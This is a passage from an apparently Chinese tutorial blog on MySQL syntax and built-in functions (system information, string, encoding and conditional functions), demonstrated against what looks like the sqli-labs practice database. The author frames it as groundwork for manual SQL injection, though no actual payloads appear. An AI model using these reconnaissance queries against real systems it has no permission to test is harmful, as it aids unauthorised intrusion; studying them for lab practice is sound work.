|</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure><p><strong>正则表达式</strong></p><p>在前面已经了解到 MySQL 可以通过 <code>LIKE ...%</code> 来进行模糊匹配。</p><p>MySQL 同样也支持正则表达式的匹配， MySQL 中使用 <code>REGEXP</code> 操作符来进行正则表达式匹配。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有 username 以 a 开头的数据</span></span><br><span class="line">select * from users <span class="built_in">where</span> username REGEXP <span class="string">'^a'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有 username 以 a 结尾的数据</span></span><br><span class="line">select * from users <span class="built_in">where</span> username REGEXP <span class="string">'a$'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有 username 包含 a 的数据</span></span><br><span class="line">select * from users <span class="built_in">where</span> username REGEXP <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有 username 0-9 结尾的数据</span></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">'[0-9]$'</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  9 | admin1   | admin1   |</span><br><span class="line">| 10 | admin2   | admin2   |</span><br><span class="line">| 11 | admin3   | admin3   |</span><br><span class="line">| 14 | admin4   | admin4   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>别名</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select version() as <span class="string">'版本'</span>;</span><br><span class="line">+--------+</span><br><span class="line">| 版本   |</span><br><span class="line">+--------+</span><br><span class="line">| 5.5.53 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>MySQL中的注释符号有三种</p><ul><li><code># 这里是注释的内容</code></li><li><code>-- 这里是注释的内容</code></li><li><code>/*这里是注释的内容*/</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里是注释的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这里是注释的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这里是注释的内容*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是一个</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="MySQL-函数"><a href="#MySQL-函数" class="headerlink" title="MySQL 函数"></a>MySQL 函数</h1><p>MySQL 有很多内置的函数，灵活运行可以提高手工注入的效率。</p><h2 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># 返回数据库版本</span><br><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line"># 返回当前数据库名</span><br><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| security   |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select schema();</span><br><span class="line">+----------+</span><br><span class="line">| schema() |</span><br><span class="line">+----------+</span><br><span class="line">| security |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select user();</span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select current_user();  </span><br><span class="line">+----------------+</span><br><span class="line">| current_user() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select session_user();</span><br><span class="line">+----------------+</span><br><span class="line">| session_user() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select system_user();</span><br><span class="line">+----------------+</span><br><span class="line">| system_user()  |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 查看当前用户连接信息</span><br><span class="line">mysql&gt; show processlist;</span><br><span class="line">+----+------+-------------------+----------+---------+------+-------+------------------+</span><br><span class="line">| Id | User | Host              | db       | Command | Time | State | Info             |</span><br><span class="line">+----+------+-------------------+----------+---------+------+-------+------------------+</span><br><span class="line">|  1 | root | 10.211.55.2:51246 | security | Query   |    0 | NULL  | show processlist |</span><br><span class="line">|  2 | root | localhost:49948   | NULL     | Sleep   |    7 |       | NULL             |</span><br><span class="line">+----+------+-------------------+----------+---------+------+-------+------------------+</span><br><span class="line"></span><br><span class="line"># 数据库路径</span><br><span class="line">mysql&gt; select @@datadir;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| @@datadir                            |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| C:\myphp_www\PHPTutorial\MySQL\data\ |</span><br><span class="line">+--------------------------------------+</span><br><span class="line"></span><br><span class="line"># MySQL安装路径</span><br><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+---------------------------------+</span><br><span class="line">| @@basedir                       |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| C:/myphp_www/PHPTutorial/MySQL/ |</span><br><span class="line">+---------------------------------+</span><br><span class="line"></span><br><span class="line"># 操作系统</span><br><span class="line">mysql&gt; select @@version_compile_os;</span><br><span class="line">+----------------------+</span><br><span class="line">| @@version_compile_os |</span><br><span class="line">+----------------------+</span><br><span class="line">| Win32                |</span><br><span class="line">+----------------------+</span><br><span class="line"></span><br><span class="line"># 返回md5加密后的字符串</span><br><span class="line">mysql&gt; select md5(233);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| md5(233)                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| e165421110ba03099a1c0393373c5b43 |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>FLOOR(X)</td><td>返回不大于X的最大整数。</td></tr><tr><td>RAND()</td><td>返回0~1的随机数</td></tr><tr><td>ROUND(X)</td><td>返回离X最近的整数，截断时要进行四舍五入。</td></tr></tbody></table><p>简单演示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select round(1.4);</span><br><span class="line">+------------+</span><br><span class="line">| round(1.4) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select round(1.5);</span><br><span class="line">+------------+</span><br><span class="line">| round(1.5) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>COUNT(expr)</td><td>返回查询结果的行数</td></tr></tbody></table><p>简单演示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from users;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| count(*) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|       13 |</span><br><span class="line">+<span class="comment">----------+</span></span><br></pre></td></tr></table></figure><h2 id="日期时间函数"><a href="#日期时间函数" class="headerlink" title="日期时间函数"></a>日期时间函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>CURDATE()、CURRENT_DATE()</td><td>返回当前日期，格式：yyyy-MM-dd</td></tr><tr><td>CURTIME()、CURRENT_TIME()</td><td>返回当前时间，格式：HH:mm:ss</td></tr><tr><td>NOW()</td><td>返回当前日期和时间，格式：yyyy-MM-dd HH:mm:ss</td></tr></tbody></table><h2 id="编码转换函数"><a href="#编码转换函数" class="headerlink" title="编码转换函数"></a>编码转换函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>BIN(X)</td><td>返回X的二进制信息</td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将N从from_base转换成to_base格式</td></tr><tr><td>HEX(X)</td><td>返回X的十六进制信息</td></tr><tr><td>MD5(X)</td><td>返回X的MD5信息</td></tr><tr><td>UNHEX(X)</td><td>对X进行十六进制解码</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(<span class="string">'MySQL'</span>);</span><br><span class="line">+--------------+</span><br><span class="line">| hex(<span class="string">'MySQL'</span>) |</span><br><span class="line">+--------------+</span><br><span class="line">| 4D7953514C   |</span><br><span class="line">+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(<span class="string">'4D7953514C'</span>);</span><br><span class="line">+---------------------+</span><br><span class="line">| unhex(<span class="string">'4D7953514C'</span>) |</span><br><span class="line">+---------------------+</span><br><span class="line">| MySQL               |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select x<span class="string">'4D7953514C'</span>;</span><br><span class="line">+---------------+</span><br><span class="line">| x<span class="string">'4D7953514C'</span> |</span><br><span class="line">+---------------+</span><br><span class="line">| MySQL         |</span><br><span class="line">+---------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0x4D7953514C;</span><br><span class="line">+--------------+</span><br><span class="line">| 0x4D7953514C |</span><br><span class="line">+--------------+</span><br><span class="line">| MySQL        |</span><br><span class="line">+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select hex(233);</span><br><span class="line">+----------+</span><br><span class="line">| hex(233) |</span><br><span class="line">+----------+</span><br><span class="line">| E9       |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(<span class="string">'E9'</span>,16,10);</span><br><span class="line">+------------------+</span><br><span class="line">| conv(<span class="string">'E9'</span>,16,10) |</span><br><span class="line">+------------------+</span><br><span class="line">| 233              |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(<span class="string">'E9'</span>,16,2);</span><br><span class="line">+-----------------+</span><br><span class="line">| conv(<span class="string">'E9'</span>,16,2) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 11101001        |</span><br><span class="line">+-----------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(<span class="string">'E9'</span>,16,8);</span><br><span class="line">+-----------------+</span><br><span class="line">| conv(<span class="string">'E9'</span>,16,8) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 351             |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ASCII(s)</td><td>返回字符串 s 的第一个字符的 ASCII 码</td></tr><tr><td>CONCAT(s1,s2…sn)</td><td>字符串 s1,s2 等多个字符串合并为一个字符串</td></tr><tr><td>CONCAT_WS(x, s1,s2…sn)</td><td>同 CONCAT(s1,s2,…) 函数，但是每个字符串直接要加上 x，x 可以是分隔符</td></tr><tr><td>GROUP_CONCAT(str1,str2,…)</td><td>函数返回一个字符串结果，默认查询所有结果。</td></tr><tr><td>LEFT(s,n)</td><td>返回字符串 s 的前 n 个字符</td></tr><tr><td>LENGTH(s)</td><td>返回字符串 s 的前 n 个字符</td></tr><tr><td>LENGTH(s)</td><td>返回字符串 s 的长度</td></tr><tr><td>MID(s,n,len)</td><td>从字符串 s 的 start 位置截取长度为 length 的子字符串</td></tr><tr><td>RIGHT(s,n)</td><td>返回字符串 s 的后 n 个字符</td></tr><tr><td>RTRIM(s)</td><td>返回字符串 s 的后 n 个字符</td></tr><tr><td>STRCMP(s1,s2)</td><td>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</td></tr><tr><td>SUBSTR(s, start, length)</td><td>从字符串 s 的 start 位置截取长度为 length 的子字符串</td></tr><tr><td>TRIM(s)</td><td>去掉字符串 s 开始和结尾处的空格</td></tr><tr><td>RTRIM(s)</td><td>去掉字符串 s 结尾处的空格</td></tr></tbody></table><p>简单的演示：</p><p><strong>ASCII(s)</strong></p><p>返回字符串 s 的第一个字符的 ASCII 码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(version());</span><br><span class="line">+------------------+</span><br><span class="line">| ascii(version()) |</span><br><span class="line">+------------------+</span><br><span class="line">|               53 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>CONCAT(s1,s2…sn)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(user(),version(),database());</span><br></pre></td></tr></table></figure><p><strong>CONCAT_WS(x, s1,s2…sn)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&apos;   &apos;,user(),version(),database());</span><br></pre></td></tr></table></figure><p><strong>GROUP_CONCAT(str1,str2,…)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(user(),version(),database());</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| group_concat(user(),version(),database()) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| root@10.211.55.25.5.53security            |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">SELECT GROUP_CONCAT(id,username,password) AS users FROM users;</span><br></pre></td></tr></table></figure><blockquote><p>嫌太挤可以用空格<code>&lt;br&gt;</code> 或者<code>&#39;:&#39;</code>分隔开</p></blockquote><p><strong>LEFT(s,n)</strong></p><p>返回字符串 s 的前 n 个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select left(user(),4);</span><br></pre></td></tr></table></figure><p><strong>LENGTH(s)</strong></p><p>返回字符串 s 的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length(user());</span><br></pre></td></tr></table></figure><p><strong>MID(s,n,len)</strong></p><p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select mid(user(),5,10);</span><br></pre></td></tr></table></figure><p><strong>RIGHT(s,n)</strong></p><p>返回字符串 s 的后 n 个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select right(user(),10);</span><br></pre></td></tr></table></figure><p><strong>RTRIM(s)</strong></p><p>去掉字符串 s 结尾处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rtrim(&quot;Good Day    &quot;) as A;</span><br></pre></td></tr></table></figure><p><strong>STRCMP(s1,s2)</strong></p><p>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select strcmp(&apos;5.5.53&apos;,version());</span><br><span class="line">+----------------------------+</span><br><span class="line">| strcmp(&apos;5.5.53&apos;,version()) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          0 |</span><br><span class="line">+----------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select strcmp(&apos;4&apos;,version());</span><br><span class="line">+-----------------------+</span><br><span class="line">| strcmp(&apos;4&apos;,version()) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                    -1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select strcmp(&apos;6&apos;,version());</span><br><span class="line">+-----------------------+</span><br><span class="line">| strcmp(&apos;6&apos;,version()) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>SUBSTR(s, start, length)</strong></p><p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(user(),1,4);</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| substr(user(),1,4) |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| root               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure><p><strong>TRIM(s)</strong></p><p>去掉字符串 s 开始和结尾处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select trim(&apos;Good Good Study! &apos;) as trim;</span><br></pre></td></tr></table></figure><h2 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h2><p><strong>IF(expr,v1,v2)</strong></p><p>如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(1&gt;0,&apos;是&apos;,&apos;否&apos;);</span><br><span class="line">+-------------------+</span><br><span class="line">| if(1&gt;0,&apos;是&apos;,&apos;否&apos;)     |</span><br><span class="line">+-------------------+</span><br><span class="line">| 是                  |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select if(left(user(),4)=&apos;root&apos;,&apos;root&apos;,&apos;not root&apos;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| if(left(user(),4)=&apos;root&apos;,&apos;root&apos;,&apos;not root&apos;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| root                                        |</span><br><span class="line">+---------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>case when [value] then [result] … else [default] end</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">case</span> 2 when 1 <span class="keyword">then</span> <span class="string">'one'</span> when 2 <span class="keyword">then</span> <span class="string">'two'</span> <span class="keyword">else</span> <span class="string">'more'</span> end as <span class="string">'CASE测试'</span>;</span><br><span class="line">+------------+</span><br><span class="line">| CASE测试   |</span><br><span class="line">+------------+</span><br><span class="line">| two        |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="keyword">case</span> 3 when 1 <span class="keyword">then</span> <span class="string">'one'</span> when 2 <span class="keyword">then</span> <span class="string">'two'</span> <span class="keyword">else</span> <span class="string">'more'</span> end as <span class="string">'CASE测试'</span>;</span><br><span class="line">+------------+</span><br><span class="line">| CASE测试   |</span><br><span class="line">+------------+</span><br><span class="line">| more       |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><h1 id="MySQL-运算符"><a href="#MySQL-运算符" class="headerlink" title="MySQL 运算符"></a>MySQL 运算符</h1><p>主要介绍 MySQL 的运算符及运算符的优先级。 MySQL 主要有以下几种运算符：</p><ul><li>算术运算符</li><li>比较运算符</li><li>逻辑运算符</li><li>位运算符</li></ul><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>MySQL 支持的算术运算符包括:</p><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">+</td><td style="text-align:left">加法</td></tr><tr><td style="text-align:left">-</td><td style="text-align:left">减法</td></tr><tr><td style="text-align:left">*</td><td style="text-align:left">乘法</td></tr><tr><td style="text-align:left">/ 或 DIV</td><td style="text-align:left">除法</td></tr><tr><td style="text-align:left">% 或 MOD</td><td style="text-align:left">取余</td></tr></tbody></table><p>在除法运算和模运算中，如果除数为0，将是非法除数，返回结果为NULL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1+2;</span><br><span class="line">+-----+</span><br><span class="line">| 1+2 |</span><br><span class="line">+-----+</span><br><span class="line">|   3 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 